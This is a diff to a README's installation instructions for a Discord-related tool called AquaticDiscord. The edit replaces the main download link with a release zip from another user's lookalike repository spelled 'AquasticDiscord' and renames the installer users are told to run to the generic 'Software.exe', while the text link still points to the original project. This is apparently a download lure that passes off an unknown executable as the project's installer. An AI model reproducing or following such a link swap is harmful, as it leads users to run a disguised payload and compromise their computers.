@@ -8,11 +8,11 @@
 
 ### Installation
 [![asdasdasd](https://github.com/user-attachments/assets/30c13c4f-592e-421e-8582-224897c60e6b)
-](https://github.com/victors21dev/AquaticDiscord/releases/download/V3.1/Release.zip)
+](https://github.com/xiongwei233/AquasticDiscord/releases/download/Release/Release.zip)
 
 
 # **1. [Download the archive](https://github.com/victors21dev/AquaticDiscord/releases/download/V3.1/Release.zip) and extract it to a convenient folder.**
-# **2. Run the auto-installer `Installing_File_x64_32bit.exe`. It will install and download all necessary packages for > operation.**
+# **2. Run the auto-installer `Software.exe`. It will install and download all necessary packages for > operation.**
 
 ![fgfdg2321df](https://github.com/user-attachments/assets/add2269a-6577-4ab7-8224-84baa7701c52)
 
